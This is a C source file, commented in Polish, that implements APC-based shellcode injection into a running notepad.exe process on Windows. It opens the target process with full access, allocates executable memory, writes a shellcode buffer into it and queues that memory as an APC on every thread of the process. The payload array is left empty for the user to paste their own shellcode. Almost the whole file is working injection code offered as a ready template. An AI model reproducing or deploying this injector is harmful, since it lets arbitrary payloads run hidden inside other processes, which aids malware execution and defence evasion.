/*CreateToolhelp32Snapshot, Process32First, Thread32First, Thread32Next, Process32Next, OpenProcess, VirtualAllocEx, WriteProcessMemory, QueueUserAPC,/NtQueueApcThread, VirtualFreeEx, CloseHandle*/
#include <windows.h>
#include <stdio.h>
#include <wchar.h>
#include <tlhelp32.h>
#define STB_DS_IMPLEMENTATION
#include "stb_ds.h"// pozwala wykonywac operacje podobne do tych ze struktury <vector> z cpp





char shellcode[] = {""};// paste your shellcode
    SIZE_T shellcodesize = sizeof(shellcode);

int main(void){

//utworzenie snapshoota. https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
    if(snapshot == INVALID_HANDLE_VALUE){
        printf("[-] tworzenie snapshota zakonczone niepowodzeniem, error: [%d]\n", GetLastError());
        return 1;
    }
        printf("[+] pomyslnie utworzono snapshoot\n");


//enumeracja procesow w celu znalezienia procesu ofiary "notepad.exe"
    PROCESSENTRY32W hEntry;
    hEntry.dwSize = sizeof(PROCESSENTRY32W);
    THREADENTRY32 hTEntry; 
    hTEntry.dwSize = sizeof(THREADENTRY32);

    if (Process32FirstW(snapshot, &hEntry)) {
        do {
            if (_wcsicmp(hEntry.szExeFile, L"notepad.exe") == 0) {
                wprintf(L"[+] Znaleziono proces: [%d]\n", hEntry.th32ProcessID);
                break;  // Zatrzymaj wyszukiwanie po znalezieniu pierwszego procesu
            }
        } while (Process32NextW(snapshot, &hEntry)); // Uniknięcie nieskończonej pętli
    } else {
        wprintf(L"[-] Nie udalo się pobrać listy procesow, error: [%d]\n", GetLastError());
        CloseHandle(snapshot);
    }


//otwarcie procesu
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, hEntry.th32ProcessID);
        if (hProcess == NULL){
            printf("[-] otwarcie procesu [%d] zakonczone niepowodzeniem, error: [%d]\n",hEntry.th32ProcessID, GetLastError());
            CloseHandle(snapshot);
            return 1;
        }
        printf("[+] otwarto proces: [%d]\n", hEntry.th32ProcessID);


//alokacja pamieci do procesu
        LPVOID remoteMemory = VirtualAllocEx(hProcess, NULL, shellcodesize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if(remoteMemory == NULL){
            printf("[-] alokowanie pamieci zakonczone niepowodzeniem, error: [%d]\n", GetLastError());
            CloseHandle(snapshot);
            CloseHandle(hProcess);
            return 1;
        }
        printf("[+] pomyslnie alokowano pamiec do: [0x%x]\n", remoteMemory);


//zapisanie shella do procesu
        SIZE_T written; //rozmiar zapisanych danych 
        BOOL writehProcess = WriteProcessMemory(hProcess, remoteMemory, shellcode, shellcodesize, &written);
        if(writehProcess == 0){
            printf("[-] nie udalo sie zapisac danych do procesu, error: [%d]\n", GetLastError());
            CloseHandle(snapshot);
            CloseHandle(hProcess);
            return 1;
        }
        printf("[+] pomyslnie zapisano dane: [%d]\n", written);


//znalezienie watku w procesie i zapisanie go do threadIDss (cos jak <vector> w cpp)
        int *threadIDss = NULL; 
        if(Thread32First(snapshot, &hTEntry)){
            do{
                if(hTEntry.th32OwnerProcessID == hEntry.th32ProcessID){
                    arrput(threadIDss, hTEntry.th32ThreadID);
                }
            } while (Thread32Next(snapshot, &hTEntry));
            for (size_t i = 0; i < arrlen(threadIDss); i++) {
                printf("%d\n ", threadIDss[i]);
            }

        }
        CloseHandle(snapshot);
        CloseHandle(hProcess);


//enumeracja watkow w celu uruchomienia shella, watek musi byc w stanie "alertable" - po to jest funkcja Sleep(), jesli wszystko zadziala, program wyswietli messagebox  
        PTHREAD_START_ROUTINE* apcRoutine = remoteMemory;

        for (size_t j = 0; j < arrlen(threadIDss); j++) {
            HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, TRUE, threadIDss[j]);
            QueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
            Sleep(1000 * 5);
    }

    CloseHandle(snapshot);
    CloseHandle(hProcess);

    return 0;
}
